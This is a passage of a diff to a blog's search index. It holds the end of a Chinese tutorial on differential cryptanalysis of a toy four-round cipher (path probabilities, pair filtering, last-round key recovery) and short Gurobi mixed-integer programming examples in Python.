-(1,1,0,1)\stackrel{\mathcal{S}}{\rightarrow}(2,2,0,2)</script><p>经过一次 $P[·]$ 置换，以概率 1 获得差分$(0,0,d,0)$：</p>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650375507202/0F3B05EDC47049CEB882AF3A187D174E" width="80%">
-</center>
-
-<script type="math/tex; mode=display">
-(2,2,0,2)\stackrel{\mathcal{S}}{\rightarrow}(0,0,d,0)</script><p>所以，两轮的差分传递描述为：</p>
-<script type="math/tex; mode=display">
-\begin{align}
-(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)
-\end{align}
-\tag{inherited\;path}</script><p>计算总概率，第一轮概率是 $\frac{10}{16}$，第二轮概率是$(\frac{6}{16})^3$，乘在一起得到 $\frac{10}{16} * (\frac{6}{16})^3=\frac{135}{4096}$，也就意味着我们在枚举密钥时，已经失去了对于穷举的优势。当然，对于这个例子可能不十分合适去解释，因为其用来 4 个 $S[·]$ ，那就假设每个$S[·]$ 前面使用的都是相同密钥，密钥是 4 位 2 进制，也就共有 $2^4=16$种可能。很显然 $\frac{135}{4096}$ 要小于 $\frac{1}{16}$ ，所以对两轮$CIPHER-4$的差分分析失去了消除噪声的优势。</p>
-<p>考虑一下原因，很自然的想到，$P[·]$ 是影响该结构差分传播的一个大问题，在第 2 轮时由于差分特征被 $P[·]$ 扩散开，所有就产生了三条路径，而计算时需要将三条路径的概率相乘，也就造成了经过两轮后差分特征概率变得如此低。同时，在第一轮输入开始就以我们预像的最大差分概率来构造差分，并将其注入明文来构造明文对，这种方法可能并不会给我们带来最佳差分路径（概率最高），因为其在前面 $CIPHER-1,2,3$ 中使用的差分特征仅仅对 $S[·]$ 而这里有 $P[·]$，所有我们应该将 $S[·]\;and\;P[·]$ 一起考虑。给出一个例子：</p>
-<script type="math/tex; mode=display">
-(0,0,2,0)\stackrel{S}{\rightarrow}(0,0,2,0)\stackrel{P}{\rightarrow}(0,0,2,0)</script><p>可能这是将差分扩散性作为优先级考虑的一种路径，但这条路径的差分特征概率确实比上面一条更高，通过表$Table\;6.2$发现，差分特征概率为$\frac{6}{16}$,为一轮的差分特征概率，同时为每一轮的差分特征概率。所有经过 4 轮之后，得到概率为 $(\frac{6}{16})^4$ 的差分特征路径：</p>
-<script type="math/tex; mode=display">
-\begin{align}
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}
-(0,0,2,0)
-\end{align}
-\tag{better\;path}</script><p>以上过程也可以通过寻找满足要求的明密文对来描述，如果要求选择的明密文对对满足在每一轮差分都为一定值,如上面的 $(0,0,2,0)$ ，则在随机密钥的情况下（其实对于我们举例的密码，密钥并没有影响到差分，但为保证其随机性，还是随机选择密钥，选择 5 个种子密钥，没有经过密钥编排，用作 4 轮，每一轮使用一个 4 位 2 进制作为密钥参与密码运算），统计对数并计算平均值，然后与总可能差分数量 $2^16=65536$ 作比，可以得到与计算特征概率几乎相同的结果：</p>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442599859/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center>
-
-<p>来比较以下，</p>
-<ul>
-<li>$better\;path$ 的差分特征概率：每一轮的都是 $\frac{6}{16}$ 所有4轮之后概率为 $(\frac{6}{16})^4$</li>
-<li>$inherited\;path$ 的差分特征概率：$\frac{10}{16}<em>(\frac{6}{10})^3</em>\frac{6}{10}*\frac{6}{10}$</li>
-</ul>
-<script type="math/tex; mode=display">
-\begin{align}
-(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,c,0)\stackrel{\mathcal{R_4}}{\rightarrow}(e,0,0,0)
-\end{align}
-\tag {inherited\;path}</script><p>由上面的对比可以看到，$better\;path$ 拥有更大的差分特征概率。那么考虑以下，在找到 4 轮差分特征之后，是否有相对于穷举的优势来猜第五轮的密钥$k_5$，很明显，$(\frac{6}{16})^4 &lt;\frac{1}{16}$，也就是噪声大于我们猜测的概率。</p>
-<p>这是否意味着差分分析的失败？？（假设上面的$better\;path$ 就是最好的差分特征传播路径）在一定轮数之后就失去了其统计上的意义？？可能差分确实在传递到一定论数之后确实会因为特征概率太小而被噪声淹没，但似乎我们漏掉了一些使概率放大的办法…</p>
-<h3 id="DC-with-Differential"><a href="#DC-with-Differential" class="headerlink" title="DC with Differential"></a>DC with Differential</h3><h4 id="Different-path-to-same-destination"><a href="#Different-path-to-same-destination" class="headerlink" title="Different path to same destination"></a>Different path to same destination</h4><p>在我们上面的分析中，计算了每一轮的路径、特征及概率，但对现实使用的密码进行差分分析时，往往不会这样做，因为拿到每一轮的结果过于复杂，往往使用一定工具，如 <a href="https://blog.nowcoder.net/n/fa9ab4fc67614b9388fd8406195cd2e0">MILP</a>，来搜索达到可提供优势的差分路径的最大长度。而该搜索过程也不会考虑中间差分值，仅仅考虑该路径的输入差分和输出差分，中间值都可以为未知，例如对$CIPHER-4$有：</p>
-<script type="math/tex; mode=display">
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)
-
-\tag{practice\;path}</script><p>假设我们限制特定的输入输出差分，如都为 $(0,0,2,0)$，那么中间值无论是多少，只要能达到这一点就算做 *优势对*，否则算作 *劣势对*。很自然的想到，经过 4 轮且满足条件：输入差分为$(0,0,2,0)$且输出差分为$(0,0,2,0)$ 的优势对远远不止中间值$better\;path$所示的那些，我们将优势对构成的路径记为 $Adv\;paths$：</p>
-<script type="math/tex; mode=display">
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
-*Adv\;path\;_1*\\
-
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,1)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
-*Adv\;path\;_2*\\
-
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
-*Adv\;path\;_3*\\
-
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
-*Adv\;path\;_4*</script><p>可以查表$Table\;6.2$可以验证以上$Adv\;paths$，及查询其特征概率，均为$(\frac{6}{16})^4$ ,所以将其特征概率相加得到 $4*(\frac{6}{16})^4=\frac{81}{1024}$ ，而 $\frac{81}{1024} &gt; \frac{1}{16}$，所以，在不考虑路径中间差分值的时候，差分攻击对分析 4 轮 $CIPHER-4$，来猜测第五轮密钥 $k_5$ 时是有一定优势的。在实践的差分分析中，我们往往也是采用这种办法。</p>
-<p>同样的，类似 $ Fig.\;6.7$ 的描述方式如下：明显的，忽略了中间差分值，使优势对的数量提升了，这对应差分特征概率的提升。</p>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442831543/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center>
-
-<h4 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h4><p>所谓差分密码分析，即识别发生差异的统计特性异常分布，产生比被我们称作噪声的枚举概率更高的猜测概率，从而使我们在猜测时，正确的数据能够从海量的数据中凸显出来，而非被其淹没。</p>
-<p>在前面已经介绍了将差分特征概率尽量提高的办法（当然还会有其他更有效的办法），那现在该把关注点放在猜测密钥上。</p>
-<p>回顾下前面整个过程：</p>
-<ol>
-<li>建$DDT$表并通过密码结果找出最佳差分路径，记录每一轮都满足差分路径的*数据*（明文1：密文1，明文2：密文2 为一对），例子中大概有1296对；</li>
-<li>只考虑输入差分和输出差分，而不需要在每一轮都满足差分路径以提高差分特征概率，将同时满足输入差分和输出差分的数据记录下来，例子中大概有 5310 对；</li>
-<li>枚举所有密文（全空间）因为寻找的差分路径是在一定概率下成立的，所有需要枚举所有密文，才能利用到差分提供的优势（才能达到使正确密钥凸显出的数据量）</li>
-</ol>
-<p>按照这个过程，我们将在最后一轮对每个密文，如果密码设计足够好的话会有 $2^{16}=65536$ 个，考虑对的话就是 $A^2_{65536}$，这将是很庞大的数据量，且对每一对密文都需要枚举 $2^{16}$ 个密钥，与构造的区分器进行对比。显然，虽然我们通过忽略中间差分路径取值来提高了特征概率，但在枚举猜密钥的过程中仍然需要很高的复杂度。</p>
-<p>所有，需要考虑将密文对筛掉一些，只留下满足条件的密文对，在第四轮之后，得到的差分值为$(0,0,2,0)$，通过查表 $Table\;6.2$ 可得，该差分经过一次 $S[·]$ 得到的值可能为 $(0,0,h,0)$ 其中 $h\in{\{1,2,9,a\}}$，而最后一轮没有 $P[·]$ ，那么对所有密文，我们需要留下的仅仅是满足条件：</p>
-<ol>
-<li><p>输入差分为$(0,0,2,0)$的明文加密所得；</p>
-</li>
-<li><p>在 1. 的基础上，将差分的第 0，1，3 半字节位不为全零，且第 2 半字节位不等于 ${\{1,2,9,a\}}$ 的密文对筛掉。</p>
-</li>
-</ol>
-<p>将所以符合上述条件的密文对记录下来，上述例子中大概有 7387 对，也就是说我们仅仅需要对 7387 个密文对，枚举所有可能的最后一轮密钥，这就将数据量降下来很多，同时，找到正确密钥的概率变为 $\frac{5310}{7387} \approx 70\%$  ,使用未经过筛选的密文对猜密钥，得到正确的概率是 $\frac{5310}{56636} \approx 8\%$，可见，筛选给猜密钥提供了很大的优势。书中给出的解释：</p>
-<p><center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650456161985/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center></p>
-<h4 id="Key-Recovery"><a href="#Key-Recovery" class="headerlink" title="Key Recovery"></a>Key Recovery</h4><p>在 4 轮之后，差分传递的特征及其概率如下：</p>
-<script type="math/tex; mode=display">
-(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)
-\tag{practice\;path}</script><p>概率为 $\frac{5310}{65536} \approx(\frac{6}{16})^4\approx0.08$，而筛选之后剩余的对的概率为 $\frac{7387}{65536} \approx0.11$，筛选出的对中可以用来求出正确密钥的对的比率为 $\frac{5310}{7387}\approx0.7$.那么，给出一个例子，如果我们有总共 $t$ 个对，筛选后留下的对为 $t\times0.11$ 个，可能满足条件的对为 $t\times0.08$ 个。比如 $t=500$ ，则会筛选出 $55$ 个满足差分特征的对，其中有 $40$ 个是由正确的最后一轮密钥加密所得，$15$ 个为无用对。为什么会有一部分无用对留下？我们筛选留下的是明文差分且密文差分都满足条件的对，而在密文位置满足差分特征的对往回推并不一定能够得到区分器末尾（例子第四轮后）的差分值。</p>
-<p><center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650463751096/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center><br>简单陈述这个过程存在的缺陷：</p>
-<ol>
-<li><p>我们只能通过对比，确切的猜出不为零的第 2 个半字节位，即 4 个 $bits$，记作目标比特 $target\;bits$ ，但其他 3 个半字节位由于没有穷尽所有可能的结果，所有无法确定其值。这并未达到分析的目的，甚至连一轮密钥都没有获取到。需要恢复更多 $bits $，需要重复该过程来恢复全 $bits$ 的密钥。</p>
-</li>
-<li><p>每次只能恢复一轮的密钥，想要恢复更多轮，可能需要更多次的重复上述过程，或者根据密钥编排算法来推所有密钥。（往往是拿到足够多轮次的密钥之后再根据密钥编排算法推）</p>
-</li>
-</ol>
-<p>*差分分析中，获得了一部分密钥 $bits$ 之后，会大大提高恢复其余更多 $bits$ 的难度。</p>
-<script type="math/tex; mode=display">
-The\;end</script>]]></content>
-      <categories>
-        <category>Cryptanalysis</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Gurobi_1_ex_mip1</title>
-    <url>/2022/05/30/Gurobi/Gurobi-1-ex-mip1/</url>
-    <content><![CDATA[<h1 id="ex-mip1"><a href="#ex-mip1" class="headerlink" title="ex_mip1"></a>ex_mip1</h1><h2 id="求解问题"><a href="#求解问题" class="headerlink" title="求解问题"></a>求解问题</h2><script type="math/tex; mode=display">
-\begin{array}{cl}
-\max & x+y+2 z \\
-\text { s.t. } & x+2 y+3 z \leq 4 \\
-& x+y \geq 1 \\
-& x, y, z \in\{0,1\}
-\end{array}</script><h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gurobipy</span><br><span class="line"><span class="keyword">from</span> gurobipy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#需要对出错情况进行反馈，所以用 try</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#建一个模型</span></span><br><span class="line">    m = gurobipy.Model(<span class="string">&quot;mip1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Model=&#x27;</span>,m)   <span class="comment">#Model= &lt;gurobi.Model Continuous instance mip1: 0 constrs, 0 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义变量</span></span><br><span class="line">    x = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    y = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    z = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#目标函数</span></span><br><span class="line">    m.setObjective(x+y+<span class="number">2</span>*z, GRB.MAXIMIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#约束条件</span></span><br><span class="line">    m.addConstr(x+<span class="number">2</span>*y+<span class="number">3</span>*z &lt;= <span class="number">4</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line">    m.addConstr(x+y &gt;= <span class="number">1</span>, <span class="string">&#x27;c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#优化模型</span></span><br><span class="line">    m.optimize()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new_Model=&#x27;</span>, m)  <span class="comment">#new_Model= &lt;gurobi.Model MIP instance mip1: 2 constrs, 3 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> m.getVars():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s %g&#x27;</span> % (v.VarName, v.X))</span><br><span class="line">    <span class="comment">#x 1</span></span><br><span class="line">    <span class="comment">#y 0</span></span><br><span class="line">    <span class="comment">#z 1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Obj: %g&#x27;</span> % m.ObjVal) <span class="comment">#Obj: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> gurobipy.GurobiError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error code &#x27;</span> + <span class="built_in">str</span>(e.errno) + <span class="string">&#x27;: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Encountered an attribute error&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/WASEFADG/article/details/105261808">https://blog.csdn.net/WASEFADG/article/details/105261808</a></p>
-]]></content>
-      <categories>
-        <category>MILP_Learning</category>
-      </categories>
-      <tags>
-        <tag>Gurobi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Gurobi-2-ex-diet</title>
-    <url>/2022/06/01/Gurobi/Gurobi-2-ex-diet/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Gurobi_Outline</title>
-    <url>/2022/05/30/Gurobi/Gurobi_Outline/</url>
-    <content><![CDATA[<h1 id="Gurobi-建模的基本流程"><a href="#Gurobi-建模的基本流程" class="headerlink" title="Gurobi 建模的基本流程"></a>Gurobi 建模的基本流程</h1><p>这样定义会使整个模型易读</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gurobipy.Model(<span class="string">&quot;Model_Name&quot;</span>)	<span class="comment">#模型</span></span><br><span class="line"></span><br><span class="line">var = m.addVar(vtype = var_type,name=<span class="string">&quot;var_name&quot;</span>)	<span class="comment">#增加变量</span></span><br><span class="line"><span class="comment">#...More vars</span></span><br><span class="line"></span><br><span class="line">m.setObject(objective_expression,objective_sense)	<span class="comment">#目标函数</span></span><br><span class="line"></span><br><span class="line">m.addConstr(constraint,constraint_name)	<span class="comment">#约束条件</span></span><br><span class="line"><span class="comment">#...More constraints</span></span><br><span class="line"></span><br><span class="line">m.optimize()	<span class="comment">#优化模型</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://ossimg.yzitc.com/2022/05/30/930c4d13cf906.png"></p>
-]]></content>
-      <categories>
-        <category>MILP_Learning</category>
-      </categories>
-      <tags>
-        <tag>Gurobi</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linear Cryptanalysis</title>
     <url>/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>线性分析通过寻找明密文与密钥间的线性相关性，构造可能产生线性偏差的掩码（搜索）来构造尽量大的线性逼近，从而逐比特的获取密钥信息。</p>
@@ -1493,6 +1481,45 @@ i.e.\ \ \ \alpha \cdot c=\beta \cdot m \oplus \beta \cdot k\ \ where\ \alpha=(1,
       </categories>
       <tags>
         <tag>DFS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gurobi_1_ex_mip1</title>
+    <url>/2022/05/30/Gurobi/Gurobi-1-ex-mip1/</url>
+    <content><![CDATA[<h1 id="ex-mip1"><a href="#ex-mip1" class="headerlink" title="ex_mip1"></a>ex_mip1</h1><h2 id="求解问题"><a href="#求解问题" class="headerlink" title="求解问题"></a>求解问题</h2><script type="math/tex; mode=display">
+\begin{array}{cl}
+\max & x+y+2 z \\
+\text { s.t. } & x+2 y+3 z \leq 4 \\
+& x+y \geq 1 \\
+& x, y, z \in\{0,1\}
+\end{array}</script><h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gurobipy</span><br><span class="line"><span class="keyword">from</span> gurobipy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#需要对出错情况进行反馈，所以用 try</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#建一个模型</span></span><br><span class="line">    m = gurobipy.Model(<span class="string">&quot;mip1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Model=&#x27;</span>,m)   <span class="comment">#Model= &lt;gurobi.Model Continuous instance mip1: 0 constrs, 0 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义变量</span></span><br><span class="line">    x = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    y = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    z = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#目标函数</span></span><br><span class="line">    m.setObjective(x+y+<span class="number">2</span>*z, GRB.MAXIMIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#约束条件</span></span><br><span class="line">    m.addConstr(x+<span class="number">2</span>*y+<span class="number">3</span>*z &lt;= <span class="number">4</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line">    m.addConstr(x+y &gt;= <span class="number">1</span>, <span class="string">&#x27;c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#优化模型</span></span><br><span class="line">    m.optimize()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new_Model=&#x27;</span>, m)  <span class="comment">#new_Model= &lt;gurobi.Model MIP instance mip1: 2 constrs, 3 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> m.getVars():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s %g&#x27;</span> % (v.VarName, v.X))</span><br><span class="line">    <span class="comment">#x 1</span></span><br><span class="line">    <span class="comment">#y 0</span></span><br><span class="line">    <span class="comment">#z 1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Obj: %g&#x27;</span> % m.ObjVal) <span class="comment">#Obj: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> gurobipy.GurobiError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error code &#x27;</span> + <span class="built_in">str</span>(e.errno) + <span class="string">&#x27;: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Encountered an attribute error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/WASEFADG/article/details/105261808">https://blog.csdn.net/WASEFADG/article/details/105261808</a></p>
+]]></content>
+      <categories>
+        <category>MILP_Learning</category>
+      </categories>
+      <tags>
+        <tag>Gurobi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gurobi-2-ex-diet</title>
+    <url>/2022/06/01/Gurobi/Gurobi-2-ex-diet/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Gurobi_Outline</title>
+    <url>/2022/05/30/Gurobi/Gurobi_Outline/</url>
+    <content><![CDATA[<h1 id="Gurobi-建模的基本流程"><a href="#Gurobi-建模的基本流程" class="headerlink" title="Gurobi 建模的基本流程"></a>Gurobi 建模的基本流程</h1><p>这样定义会使整个模型易读</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gurobipy.Model(<span class="string">&quot;Model_Name&quot;</span>)	<span class="comment">#模型</span></span><br><span class="line"></span><br><span class="line">var = m.addVar(vtype = var_type,name=<span class="string">&quot;var_name&quot;</span>)	<span class="comment">#增加变量</span></span><br><span class="line"><span class="comment">#...More vars</span></span><br><span class="line"></span><br><span class="line">m.setObject(objective_expression,objective_sense)	<span class="comment">#目标函数</span></span><br><span class="line"></span><br><span class="line">m.addConstr(constraint,constraint_name)	<span class="comment">#约束条件</span></span><br><span class="line"><span class="comment">#...More constraints</span></span><br><span class="line"></span><br><span class="line">m.optimize()	<span class="comment">#优化模型</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/30/930c4d13cf906.png"></p>
+]]></content>
+      <categories>
+        <category>MILP_Learning</category>
+      </categories>
+      <tags>
+        <tag>Gurobi</tag>
       </tags>
   </entry>
 </search>
